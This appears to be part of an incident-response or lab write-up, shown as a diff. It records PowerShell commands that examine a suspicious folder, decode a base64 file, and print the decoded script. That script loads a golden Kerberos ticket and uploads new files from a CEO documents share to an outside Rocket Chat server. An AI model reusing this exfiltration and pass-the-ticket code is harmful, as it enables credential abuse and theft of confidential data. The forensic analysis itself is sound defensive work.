@@ -23,10 +23,84 @@ Mode                 LastWriteTime         Length Name
 -a----         4/13/2026  12:51 PM            485 Network_Share_Setup.ps1
 ```
 
+```
 PS C:\Users\Administrator> type C:\Windows\System32\Network_Share_Scripts\lastrun.txt
 2026-06-05T08:50:01.5777641-04:00
+
 PS C:\Users\Administrator> Get-FileHash -alg md5 C:\Windows\System32\Network_Share_Scripts\Network_setup.exe
 
 Algorithm       Hash                                                                   Path
 ---------       ----                                                                   ----
 MD5             E930B05EFE23891D19BC354A4209BE3E                                       C:\Windows\System32\Network_Share_Scripts\Network_setup.exe
+
+PS C:\Users\Administrator> certutil -decode C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.b64 C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.txt
+PS C:\Users\Administrator> type C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.txt
+# --- Configuration ---
+$RocketChatUrl = "203.0.113.150:3000"
+$RoomId        = "Rnjgmrjyzu4zTyDvz"
+$AuthToken     = "MhbQ_Bh0ETL6TaEZ_4jZdYT-fJpxlLz-Y9KxbL3B190"
+$UserId        = "fZvfWT7BbNHDgAgRG"
+$LastRunFile   = "C:\Windows\System32\Network_Share_Scripts\lastrun.txt"   # File where the last run timestamp is stored
+$Message       = "Uploaded from ShareDrive"
+$FolderPath    = "\\nisa-dc\CEO_Documents"
+# --- Load Golden Ticket for Authentication ---
+C:\Windows\System32\Network_Share_Scripts\Network_setup.exe "kerberos::ptt C:\Windows\System32\Network_Share_Scripts\ticket.kirbi" exit
+# --- Read last run time ---
+if (Test-Path $LastRunFile) {
+    $LastRunContent = (Get-Content $LastRunFile -Raw).Trim()
+    if ([string]::IsNullOrWhiteSpace($LastRunContent)) {
+        Write-Host "Last run file is empty  resetting to default value."
+        $LastRun = (Get-Date).AddYears(-10)
+    } else {
+        try {
+            $LastRun = [datetime]::Parse( $LastRunContent )
+        } catch {
+            Write-Host "Invalid date in last run file  resetting to default value."
+            $LastRun = (Get-Date).AddYears(-10)
+        }
+    }
+    Write-Host "Last run time: $LastRun"
+} else {
+    Write-Host "No last run file found. Assuming first run."
+    $LastRun = (Get-Date).AddYears(-10)
+}
+# --- Find recently modified or created files ---
+$FilesToUpload = Get-ChildItem -Path $FolderPath -File |
+    Where-Object { $_.LastWriteTime -gt $LastRun }
+if ($FilesToUpload.Count -eq 0) {
+    Write-Host "No new or modified files since last run."
+} else {
+    Write-Host "Uploading $($FilesToUpload.Count) new/modified file(s)..."
+    # --- Set up reusable headers ---
+    $Headers = @{
+        "X-Auth-Token" = $AuthToken
+        "X-User-Id"    = $UserId
+    }
+    foreach ($File in $FilesToUpload) {
+        Write-Host "Uploading: $($File.FullName)"
+        $Form = @{
+            file = Get-Item $File.FullName
+            msg  = "$Message ($($File.Name))"
+    }
+        try {
+            $Response = Invoke-RestMethod `
+                -Uri "$RocketChatUrl/api/v1/rooms.upload/$RoomId" `
+                -Headers $Headers `
+                -Method Post `
+                -Form $Form
+            if ($Response.success) {
+                Write-Host "  File uploaded successfully: $($File.Name)"
+            } else {
+                Write-Host "  Upload failed: $($File.Name)"
+                $Response | ConvertTo-Json -Depth 5
+            }
+        } catch {
+            Write-Host "  Error uploading $($File.Name): $($_.Exception.Message)"
+        }
+    }
+}
+# --- Update last run time ---
+$Now = Get-Date
+$Now.ToString("o") | Out-File -FilePath $LastRunFile -Force
+Write-Host "Updated last run time to $Now"
+```
